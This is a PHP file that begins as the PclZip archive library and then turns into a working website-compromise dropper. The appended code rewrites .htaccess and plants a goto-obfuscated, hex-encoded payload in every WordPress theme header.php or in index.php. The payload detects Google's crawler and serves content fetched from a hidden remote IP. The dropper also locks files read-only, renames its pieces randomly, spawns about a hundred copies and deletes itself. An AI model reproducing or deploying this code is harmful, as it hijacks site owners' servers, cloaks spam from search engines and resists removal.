    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

if ($this->magic_quotes_status == 1) {
	  @set_magic_quotes_runtime($this->magic_quotes_status);
}

  return $v_result;
}

}

function PclZipUtilPathReduction($p_dir)
{
  $v_result = "";

  if ($p_dir != "") {
    $v_list = explode("/", $p_dir);

    $v_skip = 0;
    for ($i=sizeof($v_list)-1; $i>=0; $i--) {
      if ($v_list[$i] == ".") {
      }
      else if ($v_list[$i] == "..") {
	  $v_skip++;
      }
      else if ($v_list[$i] == "") {
	  if ($i == 0) {
          $v_result = "/".$v_result;
	    if ($v_skip > 0) {
	        $v_result = $p_dir;
              $v_skip = 0;
	    }
	  }
	  else if ($i == (sizeof($v_list)-1)) {
          $v_result = $v_list[$i];
	  }
	  else {
	  }
      }
      else {
	  if ($v_skip > 0) {
	    $v_skip--;
	  }
	  else {
          $v_result = $v_list[$i].($i!=(sizeof($v_list)-1)?"/".$v_result:"");
	  }
      }
    }
    
    if ($v_skip > 0) {
      while ($v_skip > 0) {
          $v_result = '../'.$v_result;
          $v_skip--;
      }
    }
  }

  return $v_result;
}

function PclZipUtilPathInclusion($p_dir, $p_path)
{
  $v_result = 1;
  
  if (   ($p_dir == '.')
      || ((strlen($p_dir) >=2) && (substr($p_dir, 0, 2) == './'))) {
    $p_dir = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_dir, 1);
  }
  if (   ($p_path == '.')
      || ((strlen($p_path) >=2) && (substr($p_path, 0, 2) == './'))) {
    $p_path = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_path, 1);
  }

  $v_list_dir = explode("/", $p_dir);
  $v_list_dir_size = sizeof($v_list_dir);
  $v_list_path = explode("/", $p_path);
  $v_list_path_size = sizeof($v_list_path);

  $i = 0;
  $j = 0;
  while (($i < $v_list_dir_size) && ($j < $v_list_path_size) && ($v_result)) {

    if ($v_list_dir[$i] == '') {
      $i++;
      continue;
    }
    if ($v_list_path[$j] == '') {
      $j++;
      continue;
    }

    if (($v_list_dir[$i] != $v_list_path[$j]) && ($v_list_dir[$i] != '') && ( $v_list_path[$j] != ''))  {
      $v_result = 0;
    }

    $i++;
    $j++;
  }

  if ($v_result) {
    while (($j < $v_list_path_size) && ($v_list_path[$j] == '')) $j++;
    while (($i < $v_list_dir_size) && ($v_list_dir[$i] == '')) $i++;

    if (($i >= $v_list_dir_size) && ($j >= $v_list_path_size)) {
      $v_result = 2;
    }
    else if ($i < $v_list_dir_size) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilCopyBlock($p_src, $p_dest, $p_size, $p_mode=0)
{
  $v_result = 1;

  if ($p_mode==0)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==1)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==2)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==3)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }

  return $v_result;
}

function PclZipUtilRename($p_src, $p_dest)
{
  $v_result = 1;

  if (!@rename($p_src, $p_dest)) {

    if (!@copy($p_src, $p_dest)) {
      $v_result = 0;
    }
    else if (!@unlink($p_src)) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilOptionText($p_option)
{
  
  $v_list = get_defined_constants();
  for (reset($v_list); $v_key = key($v_list); next($v_list)) {
    $v_prefix = substr($v_key, 0, 10);
    if ((   ($v_prefix == 'PCLZIP_OPT')
         || ($v_prefix == 'PCLZIP_CB_')
         || ($v_prefix == 'PCLZIP_ATT'))
        && ($v_list[$v_key] == $p_option)) {
      return $v_key;
    }
  }
  
  $v_result = 'Unknown';

  return $v_result;
}

function PclZipUtilTranslateWinPath($p_path, $p_remove_disk_letter=true)
{
  if (stristr(php_uname(), 'windows')) {
    if (($p_remove_disk_letter) && (($v_position = strpos($p_path, ':')) != false)) {
        $p_path = substr($p_path, $v_position+1);
    }
    if ((strpos($p_path, '\\') > 0) || (substr($p_path, 0,1) == '\\')) {
        $p_path = strtr($p_path, '\\', '/');
    }
  }
  return $p_path;
}




$archive = new PclZip($foldername."/".$myfilename.".zip");
if ($archive->extract(PCLZIP_OPT_PATH, "$foldername") == 0) {
echo "Error : ".$archive->errorInfo(true);
}
echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n";

$result = '<?php
ignore_user_abort();
set_time_limit(0);

$f1 = ".ht"; $f2 = "acc"; $f3 = "ess";
$ff = $f1.$f2.$f3;

if (file_exists($ff)) chmod ($ff, 0777);
if (filesize($ff)>120)
{
	$htout = fopen($ff, "w");
	fwrite($htout, "RewriteEngine On 
RewriteRule ^([A-Za-z0-9-]+).html$ master.php?world=5&looping=176&hl=$1 [L]");
fclose($htout);
}

?>';

$z = fopen("$foldername/zzz.php", "w");
fwrite($z, $result);
fclose($z);

 if (isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') { $protocol = 'https://'; } else { $protocol = 'http://'; } 



$code = '<?php
 goto E046f; E046f: error_reporting(0); goto tK1T3; ax4Dy: $botbotbot = str_replace("\x20", "\55", $botbotbot); goto zwniF; zwniF: if (strpos($botbotbot, "\147\157\x6f\x67\x6c\x65")) { $xxx = sqrt(25); $xxx1 = sqrt(2025); $xxx2 = sqrt(5776); $xxx3 = sqrt(400); $xxx4 = "\151\x6e\x70\165\x74"; $url = "\x68\x74\x74\160\x3a\x2f\57{$xxx}\56{$xxx1}\x2e{$xxx2}\56{$xxx3}\x2f{$xxx4}\x2f\77\x75\163\145\x72\x61\147\145\156\x74\75{$botbotbot}\46\x64\x6f\155\x61\151\156\75{$_SERVER["\110\124\x54\120\137\110\117\123\x54"]}"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result = curl_exec($ch); curl_close($ch); echo $result; if (strpos($result, "\x68\x72\145\x66\75") < 1) { $url = "{$xxx}\56{$xxx1}\56{$xxx2}\56{$xxx3}"; $fp = fsockopen($url, 80, $errno, $errstr, 30); if (!$fp) { echo "{$errstr}\40\x28{$errno}\51\74\142\x72\40\x2f\76\12"; } else { $req = "\x2f{$xxx4}\x2f\x3f\x75\x73\x65\x72\x61\147\x65\156\164\x3d{$botbotbot}\46\x64\157\x6d\141\x69\x6e\75{$_SERVER["\x48\124\x54\120\137\x48\x4f\x53\124"]}"; $out = "\107\x45\x54\x20{$req}\x20\110\x54\x54\120\57\61\56\61\xd\12"; $out .= "\x48\157\x73\x74\x3a\x20\x77\167\x77\56\x65\170\x61\155\160\x6c\x65\x2e\143\x6f\155\15\xa"; $out .= "\x43\157\x6e\156\145\143\164\151\x6f\156\x3a\40\x43\x6c\157\163\145\15\12\15\12"; fwrite($fp, $out); while (!feof($fp)) { echo fgets($fp, 128); } fclose($fp); } } } goto K8cPm; tK1T3: $botbotbot = "\x2e\56\56" . mb_strtolower($_SERVER[HTTP_USER_AGENT]); goto ax4Dy; K8cPm: ?>';

$wpfolder = ".";
if (file_exists("wp")) $wpfolder = "wp";
if (file_exists("wordpress")) $wpfolder = "wordpress";

	if ((file_exists($wpfolder."/wp-admin")) AND (file_exists($wpfolder."/wp-content")) AND (file_exists($wpfolder."/wp-includes")))
	{

	$orig_index = "<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );";
chmod ($wpfolder."/index.php", 0777);
unlink($wpfolder."/index.php");

    file_put_contents($wpfolder."/index.php", $orig_index);

chmod ($wpfolder."/index.php", 0444);
	}

if ((file_exists($wpfolder."/wp-admin")) AND (file_exists($wpfolder."/wp-content")) AND (file_exists($wpfolder."/wp-includes")))
{
chmod($wpfolder."/wp-content", 0777);
if (file_exists($wpfolder."/wp-content/themes"))
{
chmod($wpfolder."/wp-content/themes", 0777);
	$dirs = scandir($wpfolder."/wp-content/themes");
	foreach ($dirs as $dir)
	{
		if ((is_dir($wpfolder."/wp-content/themes/$dir")) AND ($dir !== ".") AND ($dir !== "..")) 
		{
chmod($wpfolder."/wp-content/themes/$dir", 0777);			
			if (file_exists($wpfolder."/wp-content/themes/$dir/header.php")) 
			{
				          $file = fopen($wpfolder."/wp-content/themes/".$dir."/header.php", "r"); 
                          $buffer = fread($file, filesize($wpfolder."/wp-content/themes/".$dir."/header.php")); 
						  $buffer2 = str_replace("\n", "11111111111111", $buffer);
						  $buffer2 = substr($buffer2, strpos($buffer2,"botbotbot"));
                          $buffer2 = substr($buffer2, strpos($buffer2,"?>")+2);
						  if (!strpos($buffer2, '$botbotbot'))
						  {
						  $buffer2 = $code.$buffer2;
						  $buffer2 = str_replace("11111111111111", "\n", $buffer2);
						  chmod($wpfolder."/wp-content/themes/$dir/header.php", 0777);
						  unlink($wpfolder."/wp-content/themes/$dir/header.php");
						  $outheader = fopen($wpfolder."/wp-content/themes/".$dir."/header.php", "w");
						  fwrite($outheader, $buffer2);
						  fclose($outheader);
						  chmod($wpfolder."/wp-content/themes/$dir/header.php", 0444);
						  }
            }

			if (file_exists($wpfolder."/wp-content/themes/$dir/footer.php")) 
			{
				          $file = fopen($wpfolder."/wp-content/themes/".$dir."/footer.php", "r"); 
                          $buffer = fread($file, filesize($wpfolder."/wp-content/themes/".$dir."/footer.php")); 
						  $buffer2 = str_replace("\n", "11111111111111", $buffer);
						  $buffer2 = substr($buffer2, strpos($buffer2,"botbotbot"));
                          $buffer2 = substr($buffer2, strpos($buffer2,"?>")+2);
						  if (!strpos($buffer2, '$botbotbot'))
						  {
						  $buffer2 = str_replace("11111111111111", "\n", $buffer2);
						  chmod($wpfolder."/wp-content/themes/$dir/footer.php", 0777);
						  unlink($wpfolder."/wp-content/themes/$dir/footer.php");
						  $outheader = fopen($wpfolder."/wp-content/themes/".$dir."/footer.php", "w");
						  fwrite($outheader, $buffer2);
						  fclose($outheader);
						  chmod($wpfolder."/wp-content/themes/$dir/footer.php", 0444);
						  }
            }			
			
			}
		}
	}
}

else
{
					      $file = fopen("index.php", "r"); 
                          $buffer = fread($file, filesize("index.php")); 
						  $buffer2 = str_replace("\n", "11111111111111", $buffer);
						  $buffer2 = substr($buffer2, strpos($buffer2,"botbotbot"));
                          $buffer2 = substr($buffer2, strpos($buffer2,"?>")+2);
						   if (!strpos($buffer2, '$botbotbot'))
						  {
						  $buffer2 = $code.$buffer2;
						  $buffer2 = str_replace("11111111111111", "\n", $buffer2);
						  chmod("index.php", 0777);
						  unlink("index.php");
						  $outheader = fopen("index.php", "w");
						  fwrite($outheader, $buffer2);
						  fclose($outheader);
						  chmod("index.php", 0444);
						  }
}


$newfilename='';     
for ($ns=1;$ns<rand(6,6);$ns++)     
{     
$r = rand (0,count($let)-1);     
$newfilename .= $let[$r];     
}  

$newredirectname='';     
for ($ns=1;$ns<rand(10,20);$ns++)     
{     
$r = rand (0,count($let)-1);     
$newredirectname .= $let[$r];     
}  

$file = fopen($foldername."/master.php", "r");  
$buffer = fread($file, filesize($foldername."/master.php")); 
$buffer = str_replace("\n", "11111111111111", $buffer);
fclose($file);
$in = fopen($foldername."/master.php", "w");
$buffer = str_replace("master.php", "$newfilename.php", $buffer);
$buffer = str_replace("11111111111111", "\n", $buffer);
fwrite($in, $buffer);
fclose($in);

$file = fopen($foldername."/master.php", "r");  
$buffer = fread($file, filesize($foldername."/master.php")); 
$buffer = str_replace("\n", "11111111111111", $buffer);
fclose($file);
$in = fopen($foldername."/master.php", "w");
$buffer = str_replace("red.php", "$newredirectname", $buffer);
$buffer = str_replace("11111111111111", "\n", $buffer);
fwrite($in, $buffer);
fclose($in);

rename($foldername."/red.php", $foldername."/$newredirectname");

$file = fopen($foldername."/zzz.php", "r");  
$buffer = fread($file, filesize($foldername."/zzz.php")); 
$buffer = str_replace("\n", "11111111111111", $buffer);
fclose($file);
$in = fopen($foldername."/zzz.php", "w");
$buffer = str_replace("master.php", "$newfilename.php", $buffer);
$buffer = str_replace("11111111111111", "\n", $buffer);
fwrite($in, $buffer);
fclose($in);

rename ($foldername."/master.php", $foldername."/$newfilename.php");

@unlink("1index.php");

unlink($foldername."/".$myfilename.".zip");
$scriptname= str_replace("/", "", $_SERVER["SCRIPT_NAME"]);
@unlink($scriptname);


chmod ($foldername."/$newfilename.php", 0555);

chmod ($foldername."/$newredirectname", 0555);

$outlink = "$protocol".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."/$foldername/$newfilename.php\n";
$outlink = str_replace("1index.php/", "", $outlink);
echo $outlink;
         ob_flush();
         flush();

for ($idcopy = 1; $idcopy<100; $idcopy++)
{
	
	$newfilename2='';     
for ($ns=1;$ns<rand(6,6);$ns++)     
{     
$r = rand (0,count($let)-1);     
$newfilename2 .= $let[$r];     
}  

copy ("$foldername/$newfilename.php", "$foldername/$newfilename2.php");
$outlink = "$protocol".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."/$foldername/$newfilename2.php\n";
$outlink = str_replace("1index.php/", "", $outlink);
echo $outlink;
         ob_flush();
         flush();
	
}


?>